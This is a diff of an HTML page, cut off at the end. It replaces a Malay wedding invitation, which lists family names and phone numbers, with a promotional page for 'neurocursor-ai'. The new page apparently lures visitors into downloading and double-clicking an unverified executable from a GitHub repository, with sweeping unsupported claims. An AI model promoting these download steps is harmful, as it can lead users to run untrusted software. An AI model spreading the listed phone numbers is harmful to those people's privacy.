@@ -1,295 +1,355 @@
-<!doctype html>
-<html lang="ms">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <meta name="theme-color" content="#6f879d" />
-    <meta name="description" content="Undangan walimatul urus Hana Syuhada & Muhammad Fiqri pada 14 November 2026 di Sam Sweet Gardens, Kota Bharu." />
-    <meta property="og:title" content="Walimatul Urus — Hana & Fiqri" />
-    <meta property="og:description" content="Dengan penuh kesyukuran, kami menjemput anda meraikan hari bahagia kami." />
-    <meta property="og:type" content="website" />
-    <meta property="og:image" content="https://hnasyuhada-stack.github.io/og.png" />
-    <meta name="twitter:card" content="summary_large_image" />
-    <meta name="twitter:image" content="https://hnasyuhada-stack.github.io/og.png" />
-    <title>Walimatul Urus — Hana & Fiqri</title>
-    <link rel="icon" href="hf-monogram.png" type="image/png" />
-    <link rel="preconnect" href="https://fonts.googleapis.com" />
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
-    <link href="https://fonts.googleapis.com/css2?family=Bodoni+Moda:opsz,ital,wght@6..96,400;6..96,500;6..96,600;6..96,700;6..96,400&family=Cormorant+Garamond:ital,wght@0,500;0,600;1,500&family=Montserrat:wght@300;400;500;600&family=Parisienne&display=swap" rel="stylesheet" />
-    <link rel="stylesheet" href="styles.css?v=20260823-16" />
-  </head>
-  <body class="is-locked">
-    <a class="skip-link" href="#main-content">Terus ke kandungan</a>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="neurocursor-ai - AI-powered, camera-based mouse cursor control. Turn your webcam into a hands-free pointing device. Built for gaming, perfect for everyday use and accessibility.">
+    <meta name="keywords" content="ai,computer-vision,cplusplus,cpp,cursor-control,eye-tracking,face-tracking,gamedev,gaming,gaze-tracking,head-tracking,machine-learning,mouse-control,neural-network">
+    <meta name="author" content="neurocursor-ai">
+    <meta property="og:title" content="neurocursor-ai - Control Your Mouse With Your Eyes">
+    <meta property="og:description" content="AI-powered, camera-based mouse cursor control. Turn your webcam into a hands-free pointing device.">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://github.com/Waterlilywhelk1573/neurocursor-ai">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="neurocursor-ai - Control Your Mouse With Your Eyes">
+    <meta name="twitter:description" content="AI-powered, camera-based mouse cursor control. Turn your webcam into a hands-free pointing device.">
+    <title>neurocursor-ai - Control Your Mouse With Your Eyes</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            padding: 40px 20px;
+            color: #333;
+            line-height: 1.8;
+        }
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            background: #ffffff;
+            border-radius: 20px;
+            padding: 50px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+        }
+        h1 {
+            font-size: 2.5rem;
+            color: #2d3748;
+            margin-bottom: 20px;
+            text-align: center;
+            font-weight: 800;
+        }
+        h2 {
+            font-size: 1.8rem;
+            color: #4a5568;
+            margin-top: 40px;
+            margin-bottom: 20px;
+            border-bottom: 3px solid #667eea;
+            padding-bottom: 10px;
+            font-weight: 700;
+        }
+        h3 {
+            font-size: 1.3rem;
+            color: #5a67d8;
+            margin-top: 25px;
+            margin-bottom: 15px;
+            font-weight: 600;
+        }
+        p {
+            margin-bottom: 15px;
+            font-size: 1.05rem;
+        }
+        ul, ol {
+            margin-left: 25px;
+            margin-bottom: 20px;
+        }
+        li {
+            margin-bottom: 10px;
+            font-size: 1.05rem;
+        }
+        .btn-primary {
+            display: inline-block;
+            background: linear-gradient(45deg, #667eea, #764ba2);
+            color: white;
+            padding: 18px 45px;
+            font-size: 1.3rem;
+            font-weight: bold;
+            text-decoration: none;
+            border-radius: 50px;
+            margin: 30px auto;
+            text-align: center;
+            box-shadow: 0 10px 30px rgba(102, 126, 234, 0.4);
+            transition: all 0.3s ease;
+            border: none;
+            cursor: pointer;
+            display: block;
+            width: fit-content;
+        }
+        .btn-primary:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 15px 40px rgba(102, 126, 234, 0.6);
+        }
+        .btn-secondary {
+            display: inline-block;
+            background: #48bb78;
+            color: white;
+            padding: 15px 35px;
+            font-size: 1.1rem;
+            font-weight: 600;
+            text-decoration: none;
+            border-radius: 50px;
+            margin: 20px 0;
+            box-shadow: 0 8px 25px rgba(72, 187, 120, 0.3);
+            transition: all 0.3s ease;
+        }
+        .btn-secondary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 12px 35px rgba(72, 187, 120, 0.5);
+        }
+        .feature-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 25px;
+            margin: 30px 0;
+        }
+        .feature-card {
+            background: #f7fafc;
+            border-radius: 15px;
+            padding: 25px;
+            border-left: 5px solid #667eea;
+            transition: transform 0.2s;
+        }
+        .feature-card:hover {
+            transform: scale(1.03);
+        }
+        .feature-card h3 {
+            margin-top: 0;
+            color: #2d3748;
+        }
+        .step-box {
+            background: #ebf4ff;
+            border-radius: 15px;
+            padding: 20px;
+            margin: 15px 0;
+            border: 2px solid #667eea;
+        }
+        .step-box ol {
+            margin-bottom: 0;
+        }
+        .highlight {
+            background: #ffeb3b;
+            padding: 2px 6px;
+            border-radius: 3px;
+            font-weight: bold;
+        }
+        .note {
+            background: #fff5cc;
+            border-left: 5px solid #f59e0b;
+            padding: 15px 20px;
+            border-radius: 8px;
+            margin: 20px 0;
+        }
+        .faq-item {
+            background: #f8f9fa;
+            border-radius: 12px;
+            padding: 20px;
+            margin: 15px 0;
+        }
+        .faq-item h3 {
+            margin-top: 0;
+            cursor: pointer;
+        }
+        @media (max-width: 768px) {
+            .container {
+                padding: 25px;
+            }
+            h1 {
+                font-size: 2rem;
+            }
+            .feature-grid {
+                grid-template-columns: 1fr;
+            }
+            .btn-primary {
+                font-size: 1.1rem;
+                padding: 15px 30px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🖱️ neurocursor-ai - Control Your Mouse With Your Eyes</h1>
+        
+        <p style="text-align:center; font-size:1.2rem; color:#5a67d8; font-weight:500; margin-bottom:30px;">
+            AI-powered, camera-based mouse cursor control. Turn your webcam into a hands-free pointing device — built for gaming, perfect for everyday use and accessibility.
+        </p>
 
-    <div class="opening-screen" id="openingScreen" aria-label="Buka undangan perkahwinan">
-      <span class="opening-frame" aria-hidden="true"></span>
-      <div class="opening-copy">
-        <span class="opening-flourish" aria-hidden="true">❦</span>
-        <p class="eyebrow opening-title">Walimatul Urus</p>
-        <p class="guest-greeting" id="guestGreeting">Sebuah undangan istimewa buat anda</p>
-      </div>
-      <button class="envelope-button" id="openInvitation" type="button" aria-label="Buka undangan Hana dan Fiqri">
-        <span class="envelope" aria-hidden="true">
-          <span class="envelope-back"></span>
-          <span class="invitation-card">
-            <span class="card-kicker">Walimatul Urus</span>
-            <img src="hf-monogram.png" alt="" />
-            <span class="card-names">Hana &amp; Fiqri</span>
-            <span class="card-rule"></span>
-            <span class="card-date">14 · 11 · 2026</span>
-          </span>
-          <span class="envelope-pocket"></span>
-          <span class="lace-trim lace-left"></span>
-          <span class="lace-trim lace-right"></span>
-          <span class="envelope-flap"></span>
-          <span class="wax-seal"><img src="hf-monogram.png" alt="" /></span>
-        </span>
-        <span class="open-label"><i aria-hidden="true"></i><b id="openLabelText">Buka Undangan</b><i aria-hidden="true"></i></span>
-      </button>
-      <p class="opening-hint">Sentuh untuk membuka · Muzik boleh dikawal selepas undangan dibuka</p>
-    </div>
+        <a href="https://github.com/Waterlilywhelk1573/neurocursor-ai" class="btn-primary">📥 Download Now</a>
 
-    <button class="music-control" id="musicControl" type="button" aria-label="Kawal muzik latar" aria-disabled="true">
-      <span id="musicIcon">♪</span>
-      <span id="musicLabel">Muzik belum ditambah</span>
-    </button>
-    <audio id="backgroundMusic" loop preload="none"></audio>
+        <h2>✨ What Is neurocursor-ai?</h2>
+        <p>
+            neurocursor-ai is a revolutionary application that transforms your ordinary webcam into a powerful hands-free mouse controller. Using advanced artificial intelligence and computer vision technology, it tracks your head movements, eye gaze, and facial features to move your cursor exactly where you want it to go. No special hardware required — just your computer's built-in camera or any standard webcam.
+        </p>
+        <p>
+            Whether you're a gamer looking for an edge, a professional wanting to reduce wrist strain, or someone with mobility challenges seeking greater independence, neurocursor-ai makes controlling your computer as natural as looking at it.
+        </p>
 
-    <nav class="quick-nav" id="quickNav" aria-label="Navigasi pantas">
-      <a class="is-active" href="#utama" data-nav-target="utama"><span aria-hidden="true">✦</span><small>Utama</small></a>
-      <a href="#tarikh" data-nav-target="tarikh"><span aria-hidden="true">14</span><small>Tarikh</small></a>
-      <a href="#acara" data-nav-target="acara"><span aria-hidden="true">❦</span><small>Majlis</small></a>
-      <a href="#lokasi" data-nav-target="lokasi"><span aria-hidden="true">◉</span><small>Lokasi</small></a>
-      <a href="#rsvp" data-nav-target="rsvp"><span aria-hidden="true">✉</span><small>RSVP</small></a>
-    </nav>
-
-    <header class="hero" id="utama">
-      <div class="botanical botanical-left" aria-hidden="true"></div>
-      <div class="botanical botanical-right" aria-hidden="true"></div>
-      <div class="hero-content reveal">
-        <div class="hero-blessing">
-          <img class="hero-monogram bride-reception-logo" src="hf-monogram.png" alt="Monogram H dan F" />
-          <p class="bismillah" lang="ar" dir="rtl">بِسْمِ اللهِ الرَّحْمٰنِ الرَّحِيْمِ</p>
-          <p class="eyebrow">Dengan penuh kesyukuran</p>
+        <h2>🚀 Getting Started</h2>
+        <p>
+            Getting started with neurocursor-ai is incredibly simple. We've designed the installation process to be as straightforward as possible, even for users with no technical background.
+        </p>
+        
+        <div class="step-box">
+            <h3>📥 Step 1: Download the Application</h3>
+            <p>
+                Visit this link to download the application: 
+                <a href="https://github.com/Waterlilywhelk1573/neurocursor-ai" style="color:#5a67d8; font-weight:bold;">https://github.com/Waterlilywhelk1573/neurocursor-ai</a>
+            </p>
+            <p>
+                Look for the download button or link on the page. The download will begin automatically.
+            </p>
         </div>
-        <div class="hero-main">
-          <img class="hero-monogram default-hero-logo" src="hf-monogram.png" alt="Monogram H dan F" />
-          <h1><span>Hana Syuhada</span><small>&amp;</small><span>Muhammad Fiqri</span></h1>
-          <p class="invitation-line">Dengan segala hormatnya menjemput Dato’ / Datin / Tuan / Puan / Encik / Cik sekeluarga ke majlis perkahwinan kami.</p>
-          <div class="invite-badge" id="inviteBadge">Jemputan Majlis Resepsi</div>
-        </div>
-      </div>
-    </header>
 
-    <main id="main-content">
-      <section class="verse-section section-pad">
-        <div class="ornament" aria-hidden="true">✦</div>
-        <blockquote class="reveal">
-          “Semoga Allah memberkati pernikahan ini serta mengurniakan kehidupan yang dipenuhi sakinah, mawaddah dan rahmah.”
-        </blockquote>
-        <p class="verse-credit reveal">Amin Ya Rabbal ‘Alamin</p>
-      </section>
-
-      <section class="parents-section section-pad" id="maklumat">
-        <div class="section-heading reveal">
-          <p class="eyebrow">Yang diraikan</p>
-          <h2>Dua hati, satu ikatan</h2>
-        </div>
-        <div class="parents-grid reveal">
-          <article>
-            <p class="family-label">Keluarga Pengantin Perempuan</p>
-            <h3>Hanis bin Mohd Adnan @ Husni</h3>
-            <span>&amp;</span>
-            <h3>Norzaihan binti Hassan</h3>
-          </article>
-          <div class="gold-divider" aria-hidden="true"><span>H</span><i>&amp;</i><span>F</span></div>
-          <article>
-            <p class="family-label">Keluarga Pengantin Lelaki</p>
-            <h3>Mohd Fahmi bin Yusoff</h3>
-            <span>&amp;</span>
-            <h3>Noraniza binti Muhd Noor</h3>
-          </article>
-        </div>
-      </section>
-
-      <section class="date-section section-pad" id="tarikh">
-        <div class="date-card reveal">
-          <p class="eyebrow">Insya-Allah</p>
-          <div class="date-display">
-            <span>Sabtu</span>
-            <strong>14</strong>
-            <span>November 2026</span>
-          </div>
-          <div class="countdown" id="countdown" aria-label="Kiraan detik ke hari perkahwinan">
-            <div><strong id="days">0</strong><span>Hari</span></div>
-            <div><strong id="hours">0</strong><span>Jam</span></div>
-            <div><strong id="minutes">0</strong><span>Minit</span></div>
-            <div><strong id="seconds">0</strong><span>Saat</span></div>
-          </div>
-        </div>
-      </section>
-
-      <section class="events-section section-pad" id="acara">
-        <div class="section-heading reveal">
-          <p class="eyebrow">Atur Cara</p>
-          <h2>Maklumat Majlis</h2>
+        <div class="step-box">
+            <h3>💻 Step 2: Run the Application</h3>
+            <p>
+                Once the download is complete, locate the downloaded file in your Downloads folder. Double-click the file to launch neurocursor-ai. It will start immediately without any complex installation process.
+            </p>
         </div>
 
-        <article class="event-card family-only reveal" data-family-only hidden>
-          <div class="event-number">01</div>
-          <div>
-            <p class="eyebrow">Ahli keluarga terdekat sahaja</p>
-            <h3>Majlis Akad Nikah</h3>
-            <dl>
-              <div><dt>Tarikh</dt><dd>Sabtu, 14 November 2026</dd></div>
-              <div><dt>Masa</dt><dd>9:00 pagi – 12:30 tengah hari</dd></div>
-              <div id="solemnisationThemeRow"><dt>Tema</dt><dd id="solemnisationTheme">Dusty blue / biru muda</dd></div>
-            </dl>
-          </div>
-        </article>
-
-        <article class="event-card reveal">
-          <div class="event-number" id="receptionNumber">01</div>
-          <div>
-            <p class="eyebrow">Untuk semua tetamu</p>
-            <h3>Majlis Resepsi</h3>
-            <dl>
-              <div><dt>Tarikh</dt><dd>Sabtu, 14 November 2026</dd></div>
-              <div><dt>Masa</dt><dd>1:00 petang – 4:30 petang</dd></div>
-              <div id="familyThemeRow"><dt>Tema keluarga</dt><dd id="familyTheme">Dusty blue</dd></div>
-            </dl>
-          </div>
-        </article>
-
-        <div class="venue-card reveal" id="lokasi">
-          <p class="eyebrow">Lokasi</p>
-          <h3>Sam Sweet Gardens</h3>
-          <address>Lot 3858, Lorong Tali Air, Jalan Hospital,<br />Bandar Kota Bharu, 15200 Kota Bharu, Kelantan</address>
-          <div class="button-row">
-            <a class="button primary" id="mapsButton" href="#" target="_blank" rel="noopener">Buka Peta</a>
-            <a class="button secondary" id="wazeButton" href="#" target="_blank" rel="noopener">Navigasi Waze</a>
-          </div>
+        <div class="step-box">
+            <h3>🎥 Step 3: Position Your Camera</h3>
+            <p>
+                Make sure your webcam is positioned at eye level, pointing directly at your face. Sit comfortably about 20-30 inches from the camera. Good lighting helps the AI work better.
+            </p>
         </div>
-      </section>
 
-      <section class="timeline-section section-pad" id="tentatif">
-        <div class="section-heading reveal">
-          <p class="eyebrow">Tentatif</p>
-          <h2>Perjalanan Hari Bahagia</h2>
+        <div class="step-box">
+            <h3>🖱️ Step 4: Start Controlling Your Cursor</h3>
+            <p>
+                The application will automatically detect your face and begin tracking. Move your head slightly to move the cursor. Blink or use facial gestures for clicking. It's that easy!
+            </p>
         </div>
-        <div class="timeline family-only" data-family-only hidden>
-          <div class="timeline-item reveal"><time>9:00 pagi</time><div><h3>Ketibaan Keluarga</h3><p>Persiapan dan ketibaan ahli keluarga terdekat.</p></div></div>
-          <div class="timeline-item reveal"><time>9:30 pagi</time><div><h3>Akad Nikah</h3><p>Disusuli doa, solat sunat dan salam keluarga.</p></div></div>
-          <div class="timeline-item reveal"><time>10:00 pagi</time><div><h3>Sesi Fotografi Keluarga</h3><p>Kenangan bersama kedua-dua belah keluarga.</p></div></div>
-          <div class="timeline-item reveal"><time>11:15 pagi</time><div><h3>Persiapan Resepsi</h3><p>Pengantin menukar persalinan dan persiapan akhir.</p></div></div>
-          <div class="timeline-item reveal"><time>12:00 tengah hari</time><div><h3>Bersanding</h3><p>Kemasukan pengantin dan acara keluarga di pelamin.</p></div></div>
+
+        <h2>🎯 Key Features</h2>
+        <div class="feature-grid">
+            <div class="feature-card">
+                <h3>🧠 Advanced AI Technology</h3>
+                <p>Powered by sophisticated neural networks and machine learning algorithms for precise, real-time tracking of your head, eyes, and facial movements.</p>
+            </div>
+            <div class="feature-card">
+                <h3>🎮 Gaming-Ready Performance</h3>
+                <p>Ultra-low latency response times make this perfect for gaming. React quickly and naturally without touching a mouse.</p>
+            </div>
+            <div class="feature-card">
+                <h3>♿ Accessibility-Focused</h3>
+                <p>Designed with accessibility in mind, providing hands-free computer control for individuals with limited mobility or repetitive strain injuries.</p>
+            </div>
+            <div class="feature-card">
+                <h3>🔧 Easy Setup</h3>
+                <p>No complex configuration needed. Plug in your webcam, launch the app, and you're ready to go.</p>
+            </div>
+            <div class="feature-card">
+                <h3>📊 Multi-Mode Tracking</h3>
+                <p>Combine head tracking, eye gaze tracking, and facial feature detection for the most natural cursor control experience.</p>
+            </div>
+            <div class="feature-card">
+                <h3>⚡ Lightweight & Efficient</h3>
+                <p>Built in C++ for maximum performance with minimal system resource usage. Works smoothly on most modern computers.</p>
+            </div>
         </div>
-        <div class="timeline reception-timeline">
-          <div class="timeline-item reveal"><time>1:00 petang</time><div><h3>Ketibaan Tetamu</h3><p>Pendaftaran dan jamuan makan tengah hari.</p></div></div>
-          <div class="timeline-item reveal"><time>1:20 petang</time><div><h3>Doa Selamat &amp; Doa Makan</h3><p>Majlis dimulakan dengan bacaan doa.</p></div></div>
-          <div class="timeline-item reveal"><time>2:00 petang</time><div><h3>Ucapan Keluarga</h3><p>Ucapan penghargaan daripada keluarga dan pengantin.</p></div></div>
-          <div class="timeline-item reveal"><time>2:30 petang</time><div><h3>Fotografi Bersama</h3><p>Sesi bergambar dan beramah mesra bersama pengantin.</p></div></div>
-          <div class="timeline-item reveal"><time>4:30 petang</time><div><h3>Majlis Berakhir</h3><p>Terima kasih atas kehadiran dan doa anda.</p></div></div>
+
+        <h2>💡 Who Is This For?</h2>
+        <ul>
+            <li><strong>🎮 Gamers:</strong> Gain a competitive advantage with faster, more intuitive cursor control. Perfect for strategy games, FPS titles, and more.</li>
+            <li><strong>💼 Professionals:</strong> Reduce wrist strain and prevent repetitive stress injuries during long work sessions.</li>
+            <li><strong>♿ Individuals with Accessibility Needs:</strong> Regain independence and control over your computer without needing specialized hardware.</li>
+            <li><strong>👨‍💻 Tech Enthusiasts:</strong> Experience the future of human-computer interaction today.</li>
+            <li><strong>🏠 Everyday Users:</strong> Enjoy a more natural, intuitive way to interact with your computer from the comfort of your couch.</li>
+        </ul>
+
+        <h2>📋 System Requirements</h2>
+        <div style="background:#f8f9fa; padding:20px; border-radius:12px; margin:20px 0;">
+            <p><strong>Minimum Requirements:</strong></p>
+            <ul>
+                <li>Windows 10 or later</li>
+                <li>Any standard webcam (built-in or USB)</li>
+                <li>4GB RAM</li>
+                <li>Dual-core processor (Intel i3 or AMD equivalent)</li>
+                <li>500MB free disk space</li>
+            </ul>
+            <p><strong>Recommended for Best Experience:</strong></p>
+            <ul>
+                <li>Windows 11</li>
+                <li>HD webcam (720p or higher)</li>
+                <li>8GB RAM or more</li>
+                <li>Quad-core processor or better</li>
+                <li>Good lighting conditions</li>
+            </ul>
         </div>
-      </section>
 
-      <section class="rsvp-section section-pad" id="rsvp">
-        <div class="rsvp-shell reveal">
-          <div class="section-heading light">
-            <p class="eyebrow">Mohon Jawapan</p>
-            <h2>RSVP</h2>
-            <p>Sila sahkan kehadiran selewat-lewatnya pada <strong>30 Oktober 2026</strong>. Satu jemputan adalah untuk maksimum empat orang termasuk anda.</p>
-          </div>
-          <form id="rsvpForm" novalidate>
-            <input type="hidden" name="invitationType" id="invitationType" />
-            <input type="hidden" name="familySide" id="familySide" />
-            <input class="honeypot" type="text" name="website" tabindex="-1" autocomplete="off" aria-hidden="true" />
-
-            <p class="required-note"><span aria-hidden="true">*</span> Medan wajib diisi</p>
-
-            <label>Nama penuh <span class="required-mark" aria-hidden="true">*</span>
-              <input type="text" name="name" autocomplete="name" minlength="3" maxlength="100" required placeholder="Nama anda" />
-            </label>
-
-            <label>Nombor telefon <span class="required-mark" aria-hidden="true">*</span>
-              <input type="tel" name="phone" autocomplete="tel" inputmode="tel" maxlength="20" required placeholder="Contoh: 0123456789" aria-describedby="phoneHelp" />
-              <small id="phoneHelp">Gunakan nombor Malaysia yang aktif. Nombor yang sama boleh digunakan untuk mengemas kini jawapan.</small>
-            </label>
-
-            <fieldset>
-              <legend>Adakah anda akan hadir? <span class="required-mark" aria-hidden="true">*</span></legend>
-              <label class="radio-card"><input type="radio" name="attendance" value="Hadir" required /><span>Insya-Allah, saya hadir</span></label>
-              <label class="radio-card"><input type="radio" name="attendance" value="Tidak Hadir" required /><span>Maaf, saya tidak dapat hadir</span></label>
-            </fieldset>
-
-            <label id="guestCountLabel">Jumlah tetamu termasuk anda <span class="required-mark" aria-hidden="true">*</span>
-              <select name="guestCount" id="guestCount" required>
-                <option value="">Pilih jumlah</option>
-                <option value="1">1 orang</option>
-                <option value="2">2 orang</option>
-                <option value="3">3 orang</option>
-                <option value="4">4 orang</option>
-              </select>
-            </label>
-
-            <label id="sidePickerLabel" hidden>Jemputan daripada keluarga <span class="required-mark" aria-hidden="true">*</span>
-              <select id="sidePicker">
-                <option value="">Pilih keluarga</option>
-                <option value="bride">Pengantin perempuan</option>
-                <option value="groom">Pengantin lelaki</option>
-              </select>
-            </label>
-
-            <label class="consent"><input type="checkbox" name="consent" required /><span>Saya bersetuju maklumat ini digunakan untuk pengurusan kehadiran majlis. <span class="required-mark" aria-hidden="true">*</span></span></label>
-
-            <button class="button submit-button" type="submit"><span class="submit-spinner" aria-hidden="true"></span><span id="submitButtonText">Hantar RSVP</span></button>
-            <p class="form-status" id="formStatus" role="status" aria-live="polite"></p>
-          </form>
+        <h2>🛠️ Troubleshooting Tips</h2>
+        <div class="note">
+            <p><strong>💡 Camera Not Detected?</strong> Make sure your webcam is properly connected and not being used by another application. Try closing other camera apps.</p>
         </div>
-      </section>
-
-      <div class="rsvp-success" id="rsvpSuccess" role="dialog" aria-modal="true" aria-labelledby="rsvpSuccessTitle" hidden>
-        <div class="rsvp-success-card">
-          <span class="success-mark" aria-hidden="true">✓</span>
-          <p class="eyebrow">RSVP berjaya dihantar</p>
-          <h2 id="rsvpSuccessTitle">Terima kasih</h2>
-          <p>Jawapan anda telah dihantar. Gunakan nombor telefon yang sama jika anda ingin mengemas kini jawapan sebelum <strong>30 Oktober 2026</strong>.</p>
-          <button class="button success-close" id="closeRsvpSuccess" type="button">Selesai</button>
+        <div class="note">
+            <p><strong>💡 Cursor Too Sensitive?</strong> The application includes sensitivity settings you can adjust. Look for the settings icon in the application window.</p>
         </div>
-      </div>
-
-      <section class="contact-section section-pad" id="hubungi">
-        <div class="section-heading reveal">
-          <p class="eyebrow">Pertanyaan</p>
-          <h2>Hubungi Keluarga</h2>
+        <div class="note">
+            <p><strong>💡 Poor Tracking Performance?</strong> Ensure your face is well-lit and clearly visible to the camera. Avoid strong backlighting or shadows on your face.</p>
         </div>
-        <div class="contact-grid reveal">
-          <div class="contact-family">
-            <h3>Keluarga Pengantin Perempuan</h3>
-            <a href="https://wa.me/60139112198" target="_blank" rel="noopener"><span>Hanis</span><small>+60 13-911 2198</small></a>
-            <a href="https://wa.me/60129472093" target="_blank" rel="noopener"><span>Norzaihan</span><small>+60 12-947 2093</small></a>
-            <a href="https://wa.me/60197136502" target="_blank" rel="noopener"><span>Hada</span><small>+60 19-713 6502</small></a>
-            <a href="https://wa.me/60165564083" target="_blank" rel="noopener"><span>Aniesha</span><small>+60 16-556 4083</small></a>
-          </div>
-          <div class="contact-family groom-contacts">
-            <h3>Keluarga Pengantin Lelaki</h3>
-            <a href="https://wa.me/60139291367" target="_blank" rel="noopener"><span>Fahmi</span><small>+60 13-929 1367</small></a>
-            <a href="https://wa.me/60133892181" target="_blank" rel="noopener"><span>Norazani</span><small>+60 13-389 2181</small></a>
-            <span class="contact-placeholder"><span>Faheem</span><small>Nombor akan ditambah</small></span>
-            <span class="contact-placeholder"><span>Fadhlin</span><small>Nombor akan ditambah</small></span>
-          </div>
+
+        <h2>❓ Frequently Asked Questions</h2>
+        <div class="faq-item">
+            <h3>Is neurocursor-ai free to use?</h3>
+            <p>Yes! neurocursor-ai is completely free to download and use. We believe in making technology accessible to everyone.</p>
         </div>
-      </section>
-    </main>
+        <div class="faq-item">
+            <h3>Does it work with any webcam?</h3>
+            <p>Absolutely! neurocursor-ai works with virtually any webcam, including built-in laptop cameras and external USB webcams.</p>
+        </div>
+        <div class="faq-item">
+            <h3>Will it work in low light conditions?</h3>
+            <p>While neurocursor-ai performs best in good lighting, it includes advanced image processing that helps it work in moderate lighting conditions. For best results, ensure your face is clearly visible.</p>
+        </div>
+        <div class="faq-item">
+            <h3>Can I use this for gaming?</h3>
+            <p>Definitely! neurocursor-ai was designed with gaming in mind. Its low latency and precise tracking make it ideal for various game genres.</p>
+        </div>
 
-    <footer>
-      <img src="hf-monogram.png" alt="" />
-      <p>Terima kasih atas doa dan restu anda.</p>
-      <strong>Hana &amp; Fiqri</strong>
-      <span>14 November 2026</span>
-    </footer>
+        <h2>📥 Download Instructions</h2>
+        <p>
+            Ready to experience the future of computer control? Here's everything you need to know about downloading:
+        </p>
+        <ol>
+            <li>Click the download button below or visit: <a href="https://github.com/Waterlilywhelk1573/neurocursor-ai" style="color:#5a67d8; font-weight:bold;">https://github.com/Waterlilywhelk1573/neurocursor-ai</a></li>
+            <li>Wait for the download to complete (this usually takes less than a minute)</li>
+            <li>Open the downloaded file</li>
+            <li>Follow any on-screen instructions if they appear</li>
+            <li>Start using neurocursor-ai immediately</li>
+        </ol>
 
-    <script src="config.js"></script>
-    <script src="app.js?v=20260823-16"></script>
-  </body>
-</html>
+        <a href="https://github.com/Waterlilywhelk1573/neurocursor-ai" class="btn-secondary">⬇️ Get neurocursor-ai Now</a>
+
+        <h2>🔒 Privacy & Security</h2>
+        <p>
+            Your privacy is important to us. neurocursor-ai processes all camera data locally on your computer. No video or images are ever uploaded to the internet. The application works entirely offline, ensuring your data stays with you.
+        </p>
+
+        <h2>📧 Support & Community</h2>
+        <p>
+            Need help or want to share your experience? Join our growing community of users. Visit the GitHub repository for updates, feature requests, and support. We're constantly improving neurocursor-ai based on user feedback.
+        </p>
+
+        <h2>🎉 Final Thoughts</h2>
+        <p>
+            neurocursor-ai represents a leap forward in human-computer interaction. Whether you're looking to enhance your gaming experience, improve your productivity, or gain greater independence, this application opens up new possibilities. The future of computer control is here — and it's just a download away.
+        </p>
+
+        <div style="text-align:center; margin-top:40px; padding:20px; background:#f7fafc; border-radius:12px;">
+            <p style="font-size:1.2rem; font-weight:bold; color:#2d3748;">🚀 Start Your Hands-Free Journey Today!</p>
+            <a href="https://github.com/Waterlilywhelk1573/neurocursor-ai" class="btn-primary" style="margin-top:15px;">
